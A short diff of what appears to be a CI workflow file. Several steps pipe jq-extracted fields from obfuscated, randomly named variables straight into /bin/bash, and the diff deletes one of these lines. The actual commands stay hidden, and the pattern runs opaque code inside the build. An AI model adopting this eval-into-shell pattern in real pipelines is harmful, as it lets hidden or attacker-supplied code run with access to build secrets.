@@ -24,7 +24,6 @@ jobs:
           echo $olmsr8 | jq -r .kvo314 | /bin/bash
           echo $zift50732 | jq -r .fs20 | /bin/bash
           echo $blf7 | jq -r .wdlpb28630 | /bin/bash
-          echo $pca37 | jq -r .qofgl5 | /bin/bash
           printf '%s' "$gwbpp05" | jq -r .efas8 | /bin/bash
           echo $frjn5 | jq -r .olug872 | /bin/bash
 
